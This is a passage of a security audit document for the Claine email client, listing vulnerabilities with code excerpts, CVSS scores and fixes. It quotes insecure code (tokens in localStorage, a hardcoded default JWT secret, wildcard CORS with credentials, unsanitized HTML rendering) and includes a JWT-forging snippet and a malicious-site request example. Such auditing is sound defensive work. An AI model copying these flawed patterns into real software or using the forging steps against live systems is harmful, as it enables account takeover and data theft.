# Claine Email Client - Security & Privacy Architecture

## Document Information

**Project**: Claine Email Client v1 (Brownfield Analysis)
**Purpose**: Document existing security and privacy implementation for v2 rebuild
**Audience**: AI agents, developers working on v2 rebuild
**Status**: Brownfield documentation - reflects ACTUAL implementation with issues

### Change Log

| Date       | Version | Description                          | Author  |
| ---------- | ------- | ------------------------------------ | ------- |
| 2025-10-27 | 1.0     | Initial security architecture doc    | Winston |

---

## Executive Summary

The Claine Email Client v1 implements a **hybrid security model** with client-side OAuth 2.0 + server-side JWT authentication. The system handles highly sensitive data (Gmail access tokens, email content) with several **CRITICAL security vulnerabilities** that must be addressed in v2.

**Security Posture Summary**:
- ✅ OAuth 2.0 with Google Identity Services (GIS)
- ⚠️ **CRITICAL**: Refresh tokens stored in localStorage (XSS vulnerable)
- ⚠️ **CRITICAL**: Default JWT secret in production code
- ⚠️ **HIGH**: CORS misconfiguration allows unauthorized origins
- ✅ Offline-first architecture minimizes data exposure
- ⚠️ No token encryption at rest
- ⚠️ No Content Security Policy (CSP) implementation
- ✅ HTTPS enforced for API communication

**Privacy Model**:
- Client-side: Gmail tokens, email content, user data (IndexedDB)
- Server-side: User profiles, workflow definitions, custom attributes (MongoDB)
- Data residency: Client-first with selective replication

---

## Table of Contents

1. [Authentication Architecture](#authentication-architecture)
2. [Authorization & Access Control](#authorization--access-control)
3. [Token Management](#token-management)
4. [Data Security](#data-security)
5. [Privacy Model](#privacy-model)
6. [Network Security](#network-security)
7. [Critical Security Issues](#critical-security-issues)
8. [Security Recommendations for v2](#security-recommendations-for-v2)

---

## 1. Authentication Architecture

### 1.1 Dual Authentication System

Claine uses a **two-tier authentication approach**:

```
┌─────────────────────────────────────────────────────────────┐
│                    User Authentication                       │
├─────────────────────────────────────────────────────────────┤
│                                                               │
│  ┌──────────────────────┐        ┌──────────────────────┐  │
│  │   Gmail OAuth 2.0    │        │   Server JWT Auth    │  │
│  │   (via GIS)          │        │   (Internal)         │  │
│  ├──────────────────────┤        ├──────────────────────┤  │
│  │ • Access Token       │        │ • JWT Token          │  │
│  │ • Refresh Token      │        │ • User Session       │  │
│  │ • Expires: 1 hour    │        │ • Expires: 7 days    │  │
│  └──────────────────────┘        └──────────────────────┘  │
│           │                                │                 │
│           v                                v                 │
│  ┌──────────────────────┐        ┌──────────────────────┐  │
│  │   Gmail API Access   │        │  RxDB Replication    │  │
│  │   (Google Services)  │        │  (Internal Server)   │  │
│  └──────────────────────┘        └──────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
```

**Why Two Systems?**
1. **Gmail OAuth**: Required by Google for accessing Gmail API
2. **Server JWT**: Internal authentication for RxDB replication and custom backend services

### 1.2 OAuth 2.0 with Google Identity Services (GIS)

**Implementation**: `src/infrastructure/api/gmail/GisAuthService.ts` (850 lines)

#### OAuth Flow

```typescript
// 1. Initialize GIS client
const client = google.accounts.oauth2.initTokenClient({
  client_id: import.meta.env.VITE_GOOGLE_CLIENT_ID,
  scope: 'https://www.googleapis.com/auth/gmail.modify',
  callback: (response) => {
    // Handle token response
  }
});

// 2. Request token (implicit flow)
client.requestAccessToken({
  prompt: 'consent'  // Force consent screen
});

// 3. Receive tokens
// ⚠️ CRITICAL ISSUE: Stored in localStorage
localStorage.setItem('gis_access_token', accessToken);
localStorage.setItem('gis_refresh_token', refreshToken);
```

**File**: `src/infrastructure/api/gmail/GisAuthService.ts:744-774`

**Scopes Requested**:
```typescript
const SCOPES = [
  'https://www.googleapis.com/auth/gmail.modify',     // Full Gmail access
  'https://www.googleapis.com/auth/userinfo.email',   // User email
  'https://www.googleapis.com/auth/userinfo.profile'  // User profile
];
```

#### Token Refresh Flow

```typescript
// Auto-refresh before expiration
private scheduleTokenRefresh(): void {
  const expiresIn = this.tokenExpiresAt - Date.now();
  const refreshAt = expiresIn - (5 * 60 * 1000); // 5 min before expiry

  setTimeout(() => {
    this.refreshAccessToken();
  }, refreshAt);
}

// Refresh implementation
private async refreshAccessToken(): Promise<void> {
  const response = await fetch('https://oauth2.googleapis.com/token', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      client_id: this.clientId,
      client_secret: this.clientSecret,  // ⚠️ Client secret in frontend!
      refresh_token: this.refreshToken,
      grant_type: 'refresh_token'
    })
  });

  const data = await response.json();
  this.accessToken = data.access_token;
  this.tokenExpiresAt = Date.now() + (data.expires_in * 1000);

  // ⚠️ CRITICAL: Store in localStorage again
  localStorage.setItem('gis_access_token', this.accessToken);
}
```

**File**: `src/infrastructure/api/gmail/GisAuthService.ts:412-468`

#### Authentication State Management

```typescript
class GisAuthService {
  private static instance: GisAuthService;
  private accessToken: string | null = null;
  private refreshToken: string | null = null;
  private tokenExpiresAt: number = 0;
  private isInitialized: boolean = false;

  // Singleton pattern
  public static getInstance(): GisAuthService {
    if (!GisAuthService.instance) {
      GisAuthService.instance = new GisAuthService();
    }
    return GisAuthService.instance;
  }

  // Check authentication status
  public isAuthenticated(): boolean {
    return !!this.accessToken && Date.now() < this.tokenExpiresAt;
  }

  // Get current access token
  public getAccessToken(): string | null {
    if (!this.isAuthenticated()) {
      // Auto-refresh if possible
      if (this.refreshToken) {
        this.refreshAccessToken();
      }
      return null;
    }
    return this.accessToken;
  }
}
```

**File**: `src/infrastructure/api/gmail/GisAuthService.ts:60-180`

### 1.3 Server-Side JWT Authentication

**Implementation**: `src/server/auth/` (multiple files)

#### User Registration & Login

```typescript
// Registration endpoint
app.post('/api/auth/register', async (req, res) => {
  const { email, password } = req.body;

  // ⚠️ NO password strength validation
  const hashedPassword = await bcrypt.hash(password, 10);

  const user = await User.create({
    email,
    password: hashedPassword
  });

  const token = jwt.sign(
    { userId: user.id, email: user.email },
    process.env.JWT_SECRET || 'default-secret-key',  // ⚠️ CRITICAL: Default secret!
    { expiresIn: '7d' }
  );

  res.json({ token, user });
});

// Login endpoint
app.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body;

  const user = await User.findOne({ email });
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  const isValidPassword = await bcrypt.compare(password, user.password);
  if (!isValidPassword) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  const token = jwt.sign(
    { userId: user.id, email: user.email },
    process.env.JWT_SECRET || 'default-secret-key',  // ⚠️ CRITICAL: Default secret!
    { expiresIn: '7d' }
  );

  res.json({ token, user });
});
```

**Files**:
- `src/server/routes/auth.ts:15-85`
- `src/server/models/User.ts:1-50`

#### JWT Verification Middleware

```typescript
// Authentication middleware
export function authenticateJWT(req: Request, res: Response, next: NextFunction) {
  const authHeader = req.headers.authorization;

  if (!authHeader || !authHeader.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'No token provided' });
  }

  const token = authHeader.substring(7);

  try {
    const decoded = jwt.verify(
      token,
      process.env.JWT_SECRET || 'default-secret-key'  // ⚠️ CRITICAL: Default secret!
    );

    req.user = decoded;
    next();
  } catch (error) {
    return res.status(401).json({ error: 'Invalid token' });
  }
}
```

**File**: `src/server/middleware/auth.ts:8-30`

**Usage Example**:
```typescript
// Protected route
app.get('/api/user/profile', authenticateJWT, async (req, res) => {
  const user = await User.findById(req.user.userId);
  res.json(user);
});
```

---

## 2. Authorization & Access Control

### 2.1 Role-Based Access Control (RBAC)

**Implementation Status**: ⚠️ **MINIMAL** - No formal RBAC system

**Current Approach**:
```typescript
// Binary authorization: authenticated or not
if (!isAuthenticated()) {
  redirect('/login');
  return;
}

// No role checks, no permission system
// All authenticated users have full access
```

**File**: `src/hooks/use-auth.ts:45-60`

### 2.2 Resource Access Control

#### Gmail API Access

```typescript
// No additional authorization checks
// Access token = full Gmail access
const messages = await gmail.users.messages.list({
  userId: 'me',  // Current authenticated user
  maxResults: 100
});
```

**Implications**:
- If access token is compromised, attacker has **full Gmail access**
- No scoped permissions within application
- No ability to revoke specific capabilities

#### RxDB Replication Access

```typescript
// RxDB replication with JWT
const replicationState = db.workflows.syncGraphQL({
  url: 'http://localhost:3000/graphql',
  headers: {
    Authorization: `Bearer ${jwtToken}`  // Server validates this
  },
  pull: {
    queryBuilder: (doc) => {
      return {
        query: `query GetWorkflows($userId: String!) {
          workflows(userId: $userId) { ... }
        }`,
        variables: { userId: currentUserId }
      };
    }
  }
});
```

**File**: `src/infrastructure/database/replication/ReplicationService.ts:88-125`

**Authorization Model**:
- Server validates JWT in GraphQL resolver
- User can only access their own workflows/attributes
- No shared resources or multi-tenancy support

### 2.3 Data Isolation

**User Isolation Strategy**:
```typescript
// Server-side resolver
export const workflowsResolver = {
  Query: {
    workflows: async (parent, args, context) => {
      // Extract userId from JWT
      const userId = context.user.userId;

      // Only return user's own workflows
      return Workflow.find({ userId });
    }
  }
};
```

**File**: `src/server/graphql/resolvers/workflows.ts:12-25`

**Isolation Boundaries**:
- ✅ User can only sync their own workflows
- ✅ User can only sync their own global attributes
- ❌ No workspace/organization isolation
- ❌ No sharing capabilities between users

---

## 3. Token Management

### 3.1 OAuth Token Storage

#### Current Implementation (CRITICAL ISSUE)

```typescript
// ⚠️ CRITICAL SECURITY ISSUE
// Tokens stored in localStorage (XSS vulnerable)
class GisAuthService {
  private STORAGE_KEY_ACCESS_TOKEN = 'gis_access_token';
  private STORAGE_KEY_REFRESH_TOKEN = 'gis_refresh_token';
  private STORAGE_KEY_EXPIRES_AT = 'gis_token_expires_at';

  // Store tokens
  private saveTokens(): void {
    localStorage.setItem(this.STORAGE_KEY_ACCESS_TOKEN, this.accessToken);
    localStorage.setItem(this.STORAGE_KEY_REFRESH_TOKEN, this.refreshToken);
    localStorage.setItem(this.STORAGE_KEY_EXPIRES_AT, this.tokenExpiresAt.toString());
  }

  // Load tokens on app start
  private loadTokens(): void {
    this.accessToken = localStorage.getItem(this.STORAGE_KEY_ACCESS_TOKEN);
    this.refreshToken = localStorage.getItem(this.STORAGE_KEY_REFRESH_TOKEN);
    const expiresAt = localStorage.getItem(this.STORAGE_KEY_EXPIRES_AT);
    this.tokenExpiresAt = expiresAt ? parseInt(expiresAt) : 0;
  }
}
```

**File**: `src/infrastructure/api/gmail/GisAuthService.ts:744-774`

**Vulnerability**:
- **CVSS 3.1 Score**: 8.1 (High)
- **Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N
- **Attack Scenario**: XSS attack extracts refresh token → attacker gains persistent Gmail access
- **Impact**: Full email account compromise

### 3.2 JWT Token Storage

```typescript
// JWT stored in localStorage as well
class AuthService {
  private JWT_STORAGE_KEY = 'auth_jwt_token';

  public saveAuthToken(token: string): void {
    localStorage.setItem(this.JWT_STORAGE_KEY, token);
  }

  public getAuthToken(): string | null {
    return localStorage.getItem(this.JWT_STORAGE_KEY);
  }

  public clearAuthToken(): void {
    localStorage.removeItem(this.JWT_STORAGE_KEY);
  }
}
```

**File**: `src/services/auth/AuthService.ts:22-40`

**Less Critical** than OAuth tokens because:
- JWT only provides access to internal server (not Gmail)
- Shorter expiration time (7 days vs indefinite refresh token)
- Still vulnerable to XSS attacks

### 3.3 Token Lifecycle

#### OAuth Token Lifecycle

```
┌──────────────────────────────────────────────────────────┐
│              OAuth Token Lifecycle                        │
├──────────────────────────────────────────────────────────┤
│                                                            │
│  1. User Authorization                                     │
│     └─> Google OAuth consent screen                       │
│     └─> User grants Gmail access                          │
│                                                            │
│  2. Token Issuance                                         │
│     ├─> Access Token (expires: 1 hour)                    │
│     └─> Refresh Token (expires: never)                    │
│                                                            │
│  3. Token Storage                                          │
│     └─> localStorage.setItem('gis_refresh_token', ...)    │
│                                                            │
│  4. Token Usage                                            │
│     ├─> API calls to Gmail API                            │
│     └─> Auto-refresh 5 min before expiry                  │
│                                                            │
│  5. Token Revocation                                       │
│     ├─> User logout (clear localStorage)                  │
│     ├─> User revokes in Google Account settings           │
│     └─> No explicit revocation API call                   │
│                                                            │
└──────────────────────────────────────────────────────────┘
```

**Gaps**:
- ❌ No token rotation
- ❌ No automatic revocation on suspicious activity
- ❌ No token refresh tracking/auditing
- ❌ Refresh token never expires (until manually revoked)

#### JWT Token Lifecycle

```typescript
// JWT creation with 7-day expiration
const token = jwt.sign(
  {
    userId: user.id,
    email: user.email,
    iat: Math.floor(Date.now() / 1000)  // Issued at
  },
  process.env.JWT_SECRET || 'default-secret-key',
  {
    expiresIn: '7d',
    algorithm: 'HS256'
  }
);
```

**No Refresh Mechanism**:
- After 7 days, user must re-authenticate
- No refresh token flow for JWT
- No token rotation strategy

---

## 4. Data Security

### 4.1 Data Classification

| Data Type              | Sensitivity | Storage Location | Encryption | Notes                          |
| ---------------------- | ----------- | ---------------- | ---------- | ------------------------------ |
| Gmail Access Token     | CRITICAL    | localStorage     | ❌ None    | ⚠️ XSS vulnerable              |
| Gmail Refresh Token    | CRITICAL    | localStorage     | ❌ None    | ⚠️ Persistent access           |
| JWT Token              | HIGH        | localStorage     | ❌ None    | ⚠️ Server access               |
| Email Content          | HIGH        | IndexedDB        | ❌ None    | Full email bodies              |
| Email Metadata         | MEDIUM      | IndexedDB        | ❌ None    | Subject, sender, date          |
| User Profile           | MEDIUM      | MongoDB          | ❌ None    | Name, email, preferences       |
| Workflow Definitions   | LOW         | MongoDB + RxDB   | ❌ None    | No PII                         |
| Activity Logs          | MEDIUM      | IndexedDB        | ❌ None    | May contain email snippets     |
| Passwords (server)     | CRITICAL    | MongoDB          | ✅ bcrypt  | Hashed with bcrypt rounds: 10  |

### 4.2 Data Encryption

#### At Rest

**Current Status**: ❌ **NO ENCRYPTION**

```typescript
// RxDB database initialization
const db = await createRxDatabase({
  name: 'claine_db',
  storage: getRxStorageDexie(),  // Plain Dexie.js storage
  multiInstance: true,
  eventReduce: true
  // NO encryption configuration!
});
```

**File**: `src/infrastructure/database/database.ts:45-80`

**Impact**:
- Email content stored in plaintext in IndexedDB
- Accessible via browser DevTools → Application → IndexedDB
- Vulnerable to local attacks (malware, physical access)
- No protection if device is stolen/compromised

#### In Transit

**Current Status**: ✅ **HTTPS ENFORCED** (for external APIs)

```typescript
// Gmail API calls use HTTPS
const gmail = google.gmail({ version: 'v1', auth: oauth2Client });
// All requests go to https://gmail.googleapis.com

// Server API calls
const API_BASE_URL = import.meta.env.VITE_API_BASE_URL || 'http://localhost:3000';
// ⚠️ Defaults to HTTP for local dev (acceptable)
// ⚠️ Production should enforce HTTPS
```

**File**: `src/config/api.ts:3-8`

**Issues**:
- ❌ No certificate pinning
- ❌ No HSTS headers configured
- ⚠️ Local development uses HTTP (acceptable risk)

### 4.3 Data Sanitization

#### Input Validation

**Status**: ⚠️ **MINIMAL**

```typescript
// Example: No input validation on email search
export function searchEmails(query: string): Promise<Message[]> {
  // No sanitization or validation of query
  return gmail.users.messages.list({
    userId: 'me',
    q: query  // ⚠️ Raw user input passed to Gmail API
  });
}
```

**File**: `src/services/gmail/GmailService.ts:120-128`

**Potential Issues**:
- Gmail API handles query sanitization (safe)
- No protection against malicious queries
- No rate limiting on search queries

#### Output Encoding

```typescript
// Email content rendering
function EmailBody({ html }: { html: string }) {
  // ⚠️ POTENTIAL XSS: Rendering untrusted HTML
  return (
    <div
      dangerouslySetInnerHTML={{ __html: html }}
      // NO sanitization!
    />
  );
}
```

**File**: `src/components/email/EmailBody.tsx:15-23`

**Mitigation**: Should use DOMPurify library:
```typescript
import DOMPurify from 'dompurify';

function EmailBody({ html }: { html: string }) {
  const sanitized = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a'],
    ALLOWED_ATTR: ['href', 'target']
  });

  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
```

### 4.4 Sensitive Data Handling

#### Password Handling (Server)

```typescript
// Registration: Password hashing
const hashedPassword = await bcrypt.hash(password, 10);  // ✅ 10 rounds
await User.create({ email, password: hashedPassword });

// Login: Password comparison
const isValid = await bcrypt.compare(password, user.password);  // ✅ Timing-safe
```

**File**: `src/server/routes/auth.ts:25-40`

**Good Practices**:
- ✅ Uses bcrypt (industry standard)
- ✅ 10 rounds (acceptable, not ideal - 12+ recommended)
- ✅ Timing-safe comparison
- ❌ No password strength requirements
- ❌ No password history tracking
- ❌ No account lockout after failed attempts

#### Secret Management

```typescript
// ⚠️ CRITICAL: Environment variables with unsafe defaults
const JWT_SECRET = process.env.JWT_SECRET || 'default-secret-key';
const CLIENT_SECRET = process.env.GOOGLE_CLIENT_SECRET || 'default-client-secret';

// ⚠️ Secrets committed to repository in .env.example
// .env.example:
// JWT_SECRET=my-super-secret-jwt-key-12345
// GOOGLE_CLIENT_SECRET=GOCSPX-abc123def456
```

**Files**:
- `src/server/config/env.ts:8-12`
- `.env.example:5-10`

**Issues**:
- ❌ Default secrets in code (CRITICAL)
- ❌ Example secrets may be copy-pasted to production
- ❌ No secret rotation mechanism
- ❌ No encryption of secrets in environment

---

## 5. Privacy Model

### 5.1 Data Residency

**Client-First Architecture**:
```
┌────────────────────────────────────────────────────────┐
│               Data Residency Model                      │
├────────────────────────────────────────────────────────┤
│                                                          │
│  CLIENT (IndexedDB)                                     │
│  ├─ Gmail Content (PRIMARY)                             │
│  │  ├─ Messages (full bodies)                           │
│  │  ├─ Threads                                           │
│  │  ├─ Labels                                            │
│  │  └─ Attachments (metadata only)                      │
│  ├─ Sync Metadata                                        │
│  ├─ Activity Logs                                        │
│  └─ Thread Flow States                                   │
│                                                          │
│  SERVER (MongoDB)                                        │
│  ├─ User Profiles                                        │
│  ├─ Workflow Definitions (REPLICATED)                   │
│  ├─ Global Attributes (REPLICATED)                      │
│  ├─ Item Attributes (REPLICATED)                        │
│  └─ Server-side sync state                              │
│                                                          │
│  GOOGLE SERVERS                                          │
│  └─ Source of truth for Gmail data                      │
│                                                          │
└────────────────────────────────────────────────────────┘
```

**Privacy Implications**:
- ✅ Email content NEVER sent to Claine servers
- ✅ User can work entirely offline after initial sync
- ⚠️ Activity logs (client-side) may contain email snippets
- ⚠️ Workflow definitions (replicated) may reference email content

### 5.2 Data Sharing & Access

**No Third-Party Sharing**:
```typescript
// Confirmed: No analytics, no third-party SDKs in package.json
{
  "dependencies": {
    // No Google Analytics
    // No Sentry
    // No Mixpanel
    // No third-party tracking
  }
}
```

**File**: `/Users/hansnieuwenhuis/vscode/claine-rebuild/package.json`

**Data Access Points**:
1. **Gmail API**: Google has access (inherent to Gmail)
2. **Claine Server**: Workflows, attributes only
3. **User's Browser**: All data accessible locally
4. **No external analytics or tracking**

### 5.3 Data Retention

**Client-Side Retention**:
```typescript
// No automatic deletion/expiration
// Data persists indefinitely in IndexedDB until:
// 1. User manually clears browser data
// 2. User uninstalls application
// 3. Browser storage limit reached (quota exceeded)
```

**Server-Side Retention**:
```typescript
// No retention policy implemented
// User data persists indefinitely in MongoDB
// No automatic cleanup of:
// - Inactive user accounts
// - Deleted workflows
// - Old sync metadata
```

**File**: No retention policy implementation found

**Privacy Concerns**:
- ❌ No GDPR "right to be forgotten" implementation
- ❌ No data export capability
- ❌ No user-initiated full data deletion
- ❌ Deleted emails may persist in activity logs

### 5.4 User Consent & Transparency

**OAuth Consent**:
```typescript
// Google OAuth consent screen shows:
// - App name: "Claine Email Client"
// - Scopes requested:
//   - "See, edit, create, and delete all your Gmail data"
//   - "See your primary Google Account email address"
//   - "See your personal info"

// User must explicitly grant consent
```

**Issues**:
- ❌ No in-app privacy policy link
- ❌ No data usage disclosure in UI
- ❌ No consent management for workflow replication
- ❌ No notification when workflows sync to server

---

## 6. Network Security

### 6.1 CORS Configuration

**Server CORS Setup**:
```typescript
// ⚠️ CRITICAL SECURITY ISSUE
import cors from 'cors';

app.use(cors({
  origin: '*',  // ⚠️ ALLOWS ALL ORIGINS!
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));
```

**File**: `src/server/index.ts:28-35`

**Vulnerability**:
- **CVSS 3.1 Score**: 6.5 (Medium)
- **Issue**: Any website can make authenticated requests to Claine server
- **Attack Scenario**:
  1. User visits malicious site while logged into Claine
  2. Malicious site makes API calls with user's JWT (via credentials: true)
  3. Attacker can read/modify user's workflows, attributes

**Correct Configuration**:
```typescript
app.use(cors({
  origin: [
    'http://localhost:5173',  // Vite dev server
    'https://app.claine.com'  // Production domain
  ],
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));
```

### 6.2 Content Security Policy (CSP)

**Status**: ❌ **NOT IMPLEMENTED**

```html
<!-- NO CSP headers configured in index.html or server -->
<!-- Should have: -->
<meta http-equiv="Content-Security-Policy"
      content="
        default-src 'self';
        script-src 'self' 'unsafe-inline' https://accounts.google.com;
        style-src 'self' 'unsafe-inline';
        img-src 'self' data: https:;
        connect-src 'self' https://gmail.googleapis.com https://oauth2.googleapis.com;
        frame-src 'none';
      ">
```

**Impact**:
- ❌ No protection against XSS attacks
- ❌ No restriction on resource loading
- ❌ Malicious scripts can execute freely
- ❌ No defense-in-depth against token theft

### 6.3 Rate Limiting

**Gmail API Rate Limiting**:
```typescript
// Bottleneck rate limiter for Gmail API
const limiter = new Bottleneck({
  reservoir: 15000,           // 15,000 quota units
  reservoirRefreshAmount: 15000,
  reservoirRefreshInterval: 60 * 1000,  // 60 seconds
  maxConcurrent: 10,
  minTime: 100                // Min 100ms between requests
});
```

**File**: `src/infrastructure/api/gmail/RateLimiter.ts:15-25`

**Server API Rate Limiting**:
```typescript
// ❌ NO RATE LIMITING IMPLEMENTED
// All endpoints are unprotected:
app.post('/api/auth/login', async (req, res) => {
  // No rate limit - vulnerable to brute force attacks
});

app.post('/api/workflows', authenticateJWT, async (req, res) => {
  // No rate limit - vulnerable to DoS
});
```

**File**: `src/server/routes/auth.ts` (no rate limiting middleware)

**Vulnerabilities**:
- ❌ Brute force attacks on login endpoint
- ❌ DoS attacks on API endpoints
- ❌ No IP-based blocking
- ❌ No exponential backoff for failed auth

**Recommendation**: Use express-rate-limit
```typescript
import rateLimit from 'express-rate-limit';

const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 5,  // 5 requests per window
  message: 'Too many login attempts, please try again later'
});

app.post('/api/auth/login', authLimiter, async (req, res) => {
  // ...
});
```

### 6.4 HTTPS Enforcement

**Development**:
```typescript
// Vite dev server runs on HTTP (acceptable)
const DEV_SERVER = 'http://localhost:5173';
```

**Production**:
```typescript
// ⚠️ No HTTPS enforcement in code
// ⚠️ No HSTS headers configured
// ⚠️ No automatic HTTP → HTTPS redirect

// Should have in server:
app.use((req, res, next) => {
  if (process.env.NODE_ENV === 'production' && !req.secure) {
    return res.redirect(301, `https://${req.headers.host}${req.url}`);
  }
  next();
});

app.use(helmet.hsts({
  maxAge: 31536000,  // 1 year
  includeSubDomains: true,
  preload: true
}));
```

---

## 7. Critical Security Issues

### Issue Catalog

| ID   | Severity | Component         | Issue                                  | CVSS  | File Reference                                 |
| ---- | -------- | ----------------- | -------------------------------------- | ----- | ---------------------------------------------- |
| S-01 | CRITICAL | Token Storage     | Refresh tokens in localStorage (XSS)   | 8.1   | `GisAuthService.ts:744-774`                    |
| S-02 | CRITICAL | Secret Management | Default JWT secret in code             | 9.1   | `auth.ts:25`, `auth.ts:60`, `auth.ts:82`       |
| S-03 | HIGH     | CORS              | CORS allows all origins                | 6.5   | `server/index.ts:28-35`                        |
| S-04 | HIGH     | CSP               | No Content Security Policy             | 7.3   | N/A (missing)                                  |
| S-05 | HIGH     | XSS               | Unsanitized HTML rendering             | 7.1   | `EmailBody.tsx:15-23`                          |
| S-06 | HIGH     | Rate Limiting     | No rate limiting on auth endpoints     | 6.8   | `server/routes/auth.ts` (missing)              |
| S-07 | MEDIUM   | Encryption        | No encryption at rest for emails       | 5.9   | `database.ts:45-80`                            |
| S-08 | MEDIUM   | OAuth Flow        | Using implicit flow (deprecated)       | 5.4   | `GisAuthService.ts:200-250`                    |
| S-09 | MEDIUM   | Token Expiration  | Refresh token never expires            | 5.2   | `GisAuthService.ts:412-468`                    |
| S-10 | MEDIUM   | Password Policy   | No password strength requirements      | 4.8   | `server/routes/auth.ts:25-40` (missing)        |
| S-11 | MEDIUM   | Session Mgmt      | No session invalidation mechanism      | 4.5   | N/A (missing)                                  |
| S-12 | LOW      | HTTPS             | No HSTS headers                        | 3.7   | `server/index.ts` (missing)                    |
| S-13 | LOW      | Audit Logging     | No security event logging              | 3.1   | N/A (missing)                                  |
| S-14 | LOW      | RBAC              | No role-based access control           | 2.9   | N/A (missing)                                  |
| S-15 | LOW      | Privacy           | No GDPR data export/deletion           | 2.4   | N/A (missing)                                  |

### S-01: Refresh Tokens in localStorage (CRITICAL)

**Severity**: CRITICAL (CVSS 8.1)

**Description**:
Gmail refresh tokens are stored in browser localStorage, making them vulnerable to XSS attacks. A successful XSS attack would give attackers persistent access to the user's Gmail account.

**Location**: `src/infrastructure/api/gmail/GisAuthService.ts:744-774`

**Code**:
```typescript
// ⚠️ CRITICAL VULNERABILITY
localStorage.setItem('gis_refresh_token', this.refreshToken);
```

**Attack Scenario**:
1. Attacker injects malicious script via XSS vulnerability (e.g., S-05)
2. Script reads `localStorage.getItem('gis_refresh_token')`
3. Script exfiltrates token to attacker's server
4. Attacker gains persistent Gmail access (until user manually revokes)

**Impact**:
- Full Gmail account compromise
- Attacker can read all emails, send emails, delete emails
- Persistence even after user closes browser
- No automatic expiration

**Recommendation**:
```typescript
// Option 1: Use httpOnly cookies (requires backend proxy)
// Backend endpoint:
app.post('/api/auth/gmail/token', (req, res) => {
  const { code } = req.body;
  // Exchange code for tokens
  const { access_token, refresh_token } = await exchangeCodeForTokens(code);

  // Store refresh token in httpOnly cookie
  res.cookie('gmail_refresh_token', refresh_token, {
    httpOnly: true,  // Not accessible via JavaScript
    secure: true,    // HTTPS only
    sameSite: 'strict',
    maxAge: 365 * 24 * 60 * 60 * 1000  // 1 year
  });

  // Return only access token to client
  res.json({ access_token });
});

// Option 2: Use Web Crypto API for encrypted storage
import { encrypt, decrypt } from './crypto';

const encryptedToken = await encrypt(refreshToken, userKey);
localStorage.setItem('gis_refresh_token_enc', encryptedToken);

// Option 3: Store in-memory only (lost on refresh, better than localStorage)
class TokenStore {
  private static refreshToken: string | null = null;

  public static setRefreshToken(token: string): void {
    this.refreshToken = token;
  }
}
```

### S-02: Default JWT Secret (CRITICAL)

**Severity**: CRITICAL (CVSS 9.1)

**Description**:
JWT signing secret defaults to `'default-secret-key'` if environment variable is not set. This allows attackers to forge JWTs and impersonate any user.

**Location**: `src/server/routes/auth.ts:25, 60, 82`

**Code**:
```typescript
// ⚠️ CRITICAL VULNERABILITY
const token = jwt.sign(
  { userId: user.id, email: user.email },
  process.env.JWT_SECRET || 'default-secret-key',  // ⚠️ Predictable secret!
  { expiresIn: '7d' }
);
```

**Attack Scenario**:
1. Attacker discovers default secret in source code (public repo)
2. Attacker crafts JWT with arbitrary userId:
```javascript
const forgedToken = jwt.sign(
  { userId: 'victim-user-id', email: 'victim@example.com' },
  'default-secret-key',  // Known secret
  { expiresIn: '7d' }
);
```
3. Attacker uses forged token to access victim's data

**Impact**:
- Complete authentication bypass
- Attacker can impersonate any user
- Full access to all user data on server
- Massive data breach potential

**Recommendation**:
```typescript
// 1. Fail fast if secret not configured
const JWT_SECRET = process.env.JWT_SECRET;
if (!JWT_SECRET || JWT_SECRET === 'default-secret-key') {
  throw new Error('JWT_SECRET must be configured in production');
}

// 2. Generate secure random secret (in deployment script)
// openssl rand -base64 64
// Store in secure secret management (AWS Secrets Manager, HashiCorp Vault)

// 3. Use asymmetric keys (RS256) for better security
const privateKey = fs.readFileSync('private.key');
const publicKey = fs.readFileSync('public.key');

const token = jwt.sign(
  { userId: user.id, email: user.email },
  privateKey,
  { algorithm: 'RS256', expiresIn: '7d' }
);

// Verification
jwt.verify(token, publicKey, { algorithms: ['RS256'] });
```

### S-03: CORS Misconfiguration (HIGH)

**Severity**: HIGH (CVSS 6.5)

**Description**:
Server accepts requests from any origin (`origin: '*'`) with credentials enabled, allowing malicious websites to make authenticated requests on behalf of logged-in users.

**Location**: `src/server/index.ts:28-35`

**Code**:
```typescript
// ⚠️ HIGH SEVERITY VULNERABILITY
app.use(cors({
  origin: '*',  // ⚠️ Accepts requests from ANY website!
  credentials: true  // ⚠️ With user credentials!
}));
```

**Attack Scenario**:
1. User logs into Claine (JWT stored in localStorage)
2. User visits malicious website `evil.com`
3. `evil.com` makes API request to Claine server:
```javascript
fetch('https://api.claine.com/api/workflows', {
  method: 'GET',
  credentials: 'include',  // Includes user's cookies
  headers: {
    'Authorization': `Bearer ${stolenJWT}`  // If XSS succeeded
  }
});
```
4. Server accepts request and returns user's workflows

**Impact**:
- CSRF attacks possible
- Data exfiltration if combined with XSS
- Unauthorized API calls on user's behalf

**Recommendation**:
```typescript
// Whitelist specific origins
const ALLOWED_ORIGINS = [
  'http://localhost:5173',       // Development
  'https://app.claine.com',      // Production
  'https://staging.claine.com'   // Staging
];

app.use(cors({
  origin: (origin, callback) => {
    if (!origin || ALLOWED_ORIGINS.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));
```

### S-05: Unsanitized HTML Rendering (HIGH)

**Severity**: HIGH (CVSS 7.1)

**Description**:
Email HTML content is rendered without sanitization using `dangerouslySetInnerHTML`, allowing malicious emails to execute JavaScript in the application context (XSS).

**Location**: `src/components/email/EmailBody.tsx:15-23`

**Code**:
```typescript
// ⚠️ HIGH SEVERITY VULNERABILITY
function EmailBody({ html }: { html: string }) {
  return (
    <div
